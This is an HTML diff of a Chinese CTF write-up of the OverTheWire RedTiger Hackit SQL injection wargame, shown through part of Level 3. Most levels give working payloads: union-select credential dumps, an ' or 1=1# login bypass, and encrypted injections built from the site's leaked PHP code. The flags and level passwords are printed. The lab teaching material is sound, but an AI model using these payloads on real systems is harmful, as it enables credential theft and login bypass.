href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-5"><span class="toc-number">6.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-5"><span class="toc-number">6.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-5"><span class="toc-number">6.3.</span> <span class="toc-text">注入过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">6.3.1.</span> <span class="toc-text">思路 ⭐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">6.3.2.</span> <span class="toc-text">过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-7"><span class="toc-number">7.</span> <span class="toc-text">Level-7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-6"><span class="toc-number">7.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-6"><span class="toc-number">7.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-6"><span class="toc-number">7.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-8"><span class="toc-number">8.</span> <span class="toc-text">Level-8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-7"><span class="toc-number">8.1.</span> <span class="toc-text">题目描述 ⭐</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-7"><span class="toc-number">8.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-7"><span class="toc-number">8.3.</span> <span class="toc-text">注入过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%96%91%E6%83%91%E7%82%B9"><span class="toc-number">8.3.1.</span> <span class="toc-text">疑惑点 ⭐</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-9"><span class="toc-number">9.</span> <span class="toc-text">Level-9</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-8"><span class="toc-number">9.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-8"><span class="toc-number">9.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-8"><span class="toc-number">9.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-10"><span class="toc-number">10.</span> <span class="toc-text">Level-10 ⭐</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-9"><span class="toc-number">10.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-9"><span class="toc-number">10.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-9"><span class="toc-number">10.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">11.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
   </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>14k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>12 分钟</span>
-    </span>
 </div>
 
-        </div>
-      </header>
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Redtiger_Hackit_WriteUp
+    </h1>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <p>网站：https://redtiger.labs.overthewire.org/</p>
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hdfzzf</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-17T16:00:00.000Z" itemprop="datePublished">2022-03-18</time>
+        
+        (Updated: <time datetime="2022-04-26T13:01:01.490Z" itemprop="dateModified">2022-04-26</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>, <a class="tag-link-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>网站：https://redtiger.labs.overthewire.org/</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161838.png" /></p>
 <span id="more"></span>
 <h1 id="level-1">Level-1</h1>
 <h2 id="题目描述">题目描述</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152754.png" /></p>
 <p>点击 <code>1</code> 发现 url 出现 <code>cat=1</code> ，并且页面出现了一些变化 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152853.png" /></p>
-<p>url: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level1.php?cat=1</span><br></pre></td></tr></table></figure></p>
+<p>url: <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;redtiger.labs.overthewire.org&#x2F;level1.php?cat&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <h2 id="测试注入点">测试注入点</h2>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cat=1=1</span><br><span class="line">?cat=1=2</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?cat&#x3D;1&#x3D;1
+?cat&#x3D;1&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>如上 payload，后者出现 <code>This category does not exist!</code>，而前者正常，说明存在注入点，并且为数字型，即没有闭合方式。</p>
 <h2 id="注入过程">注入过程</h2>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 测试多少列：?cat=1 order by 4</span><br><span class="line">2. 测试显示位：?cat=-1 union select 1,2,3,4</span><br><span class="line">3. 测得数据库为hackit：?cat=-1 union select 1,2,3,database()</span><br></pre></td></tr></table></figure>
-<p>如果按照常规的显示表、列会出现 <code>Some things are disabled!!!</code> 也就是被过滤了。但是考虑到表名给我们了，并且根据描述，可以猜测表内有<code>username, password</code> 两个字段。因此构造如下paylaod： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cat=-1 union select 1,2,username,password from level1_users</span><br></pre></td></tr></table></figure></p>
-<p>得到用户名为：Hornoxe，密码为：thatwaseasy。成功登录： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 27cbddc803ecde822d87a7e8639f9315  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: passwords_will_change_over_time_let_us_do_a_shitty_rhyme</span><br></pre></td></tr></table></figure></p>
+<pre class="line-numbers language-none"><code class="language-none">1. 测试多少列：?cat&#x3D;1 order by 4
+2. 测试显示位：?cat&#x3D;-1 union select 1,2,3,4
+3. 测得数据库为hackit：?cat&#x3D;-1 union select 1,2,3,database()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>如果按照常规的显示表、列会出现 <code>Some things are disabled!!!</code> 也就是被过滤了。但是考虑到表名给我们了，并且根据描述，可以猜测表内有<code>username, password</code> 两个字段。因此构造如下paylaod： <pre class="line-numbers language-none"><code class="language-none">?cat&#x3D;-1 union select 1,2,username,password from level1_users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>得到用户名为：Hornoxe，密码为：thatwaseasy。成功登录： <pre class="line-numbers language-none"><code class="language-none">You can raise your wechall.net score with this flag: 27cbddc803ecde822d87a7e8639f9315  
+  
+The password for the next level is: passwords_will_change_over_time_let_us_do_a_shitty_rhyme<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
 <p>可以到wechall上提交flag，网址：https://www.wechall.net/14-levels-on-Hackit.html</p>
 <h1 id="level-2">Level-2</h1>
 <h2 id="题目描述-1">题目描述</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318153929.png" /></p>
 <p>根据描述，这道题是登录绕过。</p>
 <h2 id="测试注入点-1">测试注入点</h2>
-<p>分别对username和password测试，结果如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;&amp;password=123&amp;login=Login</span><br></pre></td></tr></table></figure> 对应：</p>
+<p>分别对username和password测试，结果如下： <pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&#39;&amp;password&#x3D;123&amp;login&#x3D;Login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre> 对应：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154813.png" /></p>
-<p>而 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;&amp;login=Login</span><br></pre></td></tr></table></figure></p>
+<p>而 <pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;123&#39;&amp;login&#x3D;Login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>对应： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154617.png" /></p>
 <p>因此注入点应该在password。</p>
-<p>并且 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
+<p>并且 <pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;123&#39;#&amp;login&#x3D;Login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>则不出现报错信息，只出现 <code>login incorrect!</code>。这就更加确定password为注入点。</p>
 <h2 id="注入过程-1">注入过程</h2>
-<p>本题为登录绕过，因此尝试万能密码： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27; or 1=1#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
+<p>本题为登录绕过，因此尝试万能密码： <pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;123&#39; or 1&#x3D;1#&amp;login&#x3D;Login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>发现成功登录： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154759.png" /></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 1222e2d4ad5da677efb188550528bfaa  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: feed_the_cat_who_eats_your_bread</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">You can raise your wechall.net score with this flag: 1222e2d4ad5da677efb188550528bfaa  
+  
+The password for the next level is: feed_the_cat_who_eats_your_bread<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h1 id="level-3">Level-3</h1>
 <h2 id="题目描述-2">题目描述</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154944.png" /></p>
 <p>本题很有难度，注意提示 <code>try to get an error</code>。点击 <code>TheCow</code> 和 <code>Admin</code> url会出现 <code>usr</code> 参数，但是不乱是 <code>1=1</code> 还是 <code>1=2</code> 或者加单引号都不起作用，并且将原来的usr经过base64解码后得到的也只是一串数字，跟TheCow和Admin无法对上。查看大佬的writeup之后发现，需要<strong>传入数组让它报错</strong>！</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318155401.png" /></p>
-<p>注意 <code>/var/www/html/hackit/urlcrypt.inc</code> ，这是一个文件，输入网址：<code>http://redtiger.labs.overthewire.org/urlcrypt.inc</code> 并且查看源码得到如下代码： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// warning! ugly code ahead :)</span></span><br><span class="line">	<span class="comment">// requires php5.x, sorry for that</span></span><br><span class="line">  		</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$cryptedstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> =<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$temp</span> = ord(substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">1</span>)) ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">while</span>(strlen(<span class="variable">$temp</span>)&lt;<span class="number">3</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$temp</span> = <span class="string">&quot;0&quot;</span>.<span class="variable">$temp</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>. <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> base64_encode(<span class="variable">$cryptedstr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">decrypt</span> (<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%&#x27;</span>,<span class="variable">$str</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$str</span> = base64_decode(<span class="variable">$str</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">null</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$decStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>+=<span class="number">3</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$array</span>[<span class="variable">$i</span>/<span class="number">3</span>] = substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">3</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$s</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$a</span> = <span class="variable">$s</span> ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">					<span class="variable">$decStr</span> .= chr(<span class="variable">$a</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>注意 <code>/var/www/html/hackit/urlcrypt.inc</code> ，这是一个文件，输入网址：<code>http://redtiger.labs.overthewire.org/urlcrypt.inc</code> 并且查看源码得到如下代码： <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token comment">// warning! ugly code ahead :)</span>
+	<span class="token comment">// requires php5.x, sorry for that</span>
+  		
+	<span class="token keyword">function</span> <span class="token function-definition function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token variable">$cryptedstr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+		<span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">3284724</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
+		<span class="token punctuation">&#123;</span>
+			<span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			
+			<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">)</span>
+			<span class="token punctuation">&#123;</span>
+				<span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0"</span><span class="token operator">.</span><span class="token variable">$temp</span><span class="token punctuation">;</span>
+			<span class="token punctuation">&#125;</span>
+			<span class="token variable">$cryptedstr</span> <span class="token operator">.=</span> <span class="token variable">$temp</span><span class="token operator">.</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+		<span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$cryptedstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+  
+	<span class="token keyword">function</span> <span class="token function-definition function">decrypt</span> <span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">3284724</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token punctuation">&#123;</span>
+			<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$str</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$str</span> <span class="token operator">!=</span> <span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$str</span> <span class="token operator">!=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>
+			<span class="token punctuation">&#123;</span>
+				<span class="token variable">$decStr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+				
+				<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">+=</span><span class="token number">3</span><span class="token punctuation">)</span>
+				<span class="token punctuation">&#123;</span>
+					<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token punctuation">&#125;</span>
+				<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$array</span> <span class="token keyword">as</span> <span class="token variable">$s</span><span class="token punctuation">)</span>
+				<span class="token punctuation">&#123;</span>
+					<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$s</span> <span class="token operator">^</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+					<span class="token variable">$decStr</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token punctuation">&#125;</span>
+				
+				<span class="token keyword">return</span> <span class="token variable">$decStr</span><span class="token punctuation">;</span>
+			<span class="token punctuation">&#125;</span>
+			<span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+		<span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>注意前面的提示，代码只能运行在PHP5.x 版本，太高或者太低的版本会导致最终的加密结果不对！！！</p>
 <h2 id="测试注入点-2">测试注入点</h2>
 <p>推荐网址，可以选择php版本：http://www.dooccn.com/php5.5/</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160027.png" /></p>
 <p>将点击Admin之后得到的usr的值代入解密发现结果正好是Admin，因此得出结论，usr就是注入点，并且需要将payload经过加密后再传入。将 <code>Admin'</code> 加密后传入，发现报错，而 <code>Admin'#</code> 加密后传入正常显示。因此闭合方式为单引号。</p>
 <h2 id="注入过程-2">注入过程</h2>
-<p>首先，表名已经给了，为：<code>level3_users</code>，需要获得Admin的密码，猜测字段名为：<code>password</code>。（这个网站的字段名都比较正常）因此构造payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试字段数：?usr=Admin&#x27; order by 7#  </span><br><span class="line">加密后：MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试显示位：?usr=&#x27; union select 1,2,3,4,5,6,7# </span><br><span class="line">加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMjAzMTY2</span><br></pre></td></tr></table></figure>
+<p>首先，表名已经给了，为：<code>level3_users</code>，需要获得Admin的密码，猜测字段名为：<code>password</code>。（这个网站的字段名都比较正常）因此构造payload： <pre class="line-numbers language-none"><code class="language-none">测试字段数：?usr&#x3D;Admin&#39; order by 7#  
+加密后：MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<pre class="line-numbers language-none"><code class="language-none">测试显示位：?usr&#x3D;&#39; union select 1,2,3,4,5,6,7# 
+加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMjAzMTY2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160839.png" /></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">得到密码：?usr=&#x27; union select 1,2,3,4,5,6,password from level3_users wehre username=&#x27;admin&#x27;# </span><br><span class="line">加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMTQwMjI4MDYzMTk4MTM1MTA3MTA2MTgwMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTU4MjIwMDcxMDQwMjIwMjA5MDMz</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">得到密码：?usr&#x3D;&#39; union select 1,2,3,4,5,6,password from level3_users wehre username&#x3D;&#39;admin&#39;# 
